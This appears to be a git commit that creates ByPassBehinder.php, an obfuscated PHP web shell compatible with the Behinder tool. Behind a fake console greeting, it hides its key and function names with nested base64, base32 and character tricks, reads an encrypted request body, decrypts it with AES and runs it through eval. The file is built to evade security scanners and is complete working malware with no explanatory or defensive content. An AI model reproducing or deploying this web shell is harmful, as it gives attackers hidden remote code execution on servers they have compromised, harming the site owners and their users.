e878e6ca6dc544990d53a17973fea851419cec40
BJM <121654212+BJM11@users.noreply.github.com>
2023-02-11 00:34:21 +0800

    Create ByPassBehinder.php

---
+++ ByPassBehinder.php
@@ -0,0 +1,45 @@
+Hello Administrator!
+WelCome To Tas9er PHP Console!<?php
+@error_reporting(0);
+session_start();
+    $govhwb5sZCw= base64_decode(base64_decode("TVRaaFkyRmpZekExWVdGbVlXWTI=")).chr(55);
+    $_SESSION['k']=$govhwb5sZCw;
+    session_write_close();
+    $govS6gAZDs2zplsudL=base64_decode(base64_decode("YjJKMWFHRnZjbkJtTlhWM05EUmtkbTl4"));
+    $govVq7D='openssl';
+    $govSnvnKfyOW5V3=govE8ePbqYmhmd($govS6gAZDs2zplsudL);
+    $govsQoD5vSt2aNgGHD="file_g".chr(101)."t_"."con".base64_decode("dGVudHM=");
+    $govjmmi=$govsQoD5vSt2aNgGHD($govSnvnKfyOW5V3);
+    if(!extension_loaded($govVq7D))
+    {
+        $govp3P="base64_"."decode";
+        $govjmmi=$govp3P("/*X]-DP@i*/".$govjmmi);
+        for($i=0;$i<strlen($govjmmi);$i++) {
+                 
+            }
+    }
+    $govjmmi=openssl_decrypt($govjmmi, base64_decode(base64_decode("UVVWVE1UST0=")).chr(56), $govhwb5sZCw);
+    $gov6PkU6dE=explode('|',$govjmmi);
+    $govcFy1=$gov6PkU6dE[1];
+    class govh7{public function __invoke($p) {eval("/*X]-DP@i*/".$p."");}}
+    @call_user_func(new govh7(),$govcFy1);
+    function govE8ePbqYmhmd($gov8dsX7Fvq){
+    $di15 = '';
+    $goveJb64Tb8juVOYT = (2827+62888)*intval(chr(48));
+    $govtfCXDga2tb6FXQ = (4876-17066)*intval(chr(48));
+    for ($i = 0, $j = strlen($gov8dsX7Fvq); $i < $j; $i++){
+        $goveJb64Tb8juVOYT <<= 5;
+        if ($gov8dsX7Fvq[$i] >= 'a' && $gov8dsX7Fvq[$i] <= 'z'){
+            $goveJb64Tb8juVOYT += (ord($gov8dsX7Fvq[$i]) - 97);
+        } elseif ($gov8dsX7Fvq[$i] >= '2' && $gov8dsX7Fvq[$i] <= '7') {
+            $goveJb64Tb8juVOYT += (24 + $gov8dsX7Fvq[$i]);
+        } else {
+            exit(1);
+        }
+        $govtfCXDga2tb6FXQ += 5;
+        while ($govtfCXDga2tb6FXQ >= 8){
+            $govtfCXDga2tb6FXQ -= 8;
+            $di15 .= chr($goveJb64Tb8juVOYT >> $govtfCXDga2tb6FXQ);
+            $goveJb64Tb8juVOYT &= ((1 << $govtfCXDga2tb6FXQ) - 1);}}
+    return $di15;}
+?>
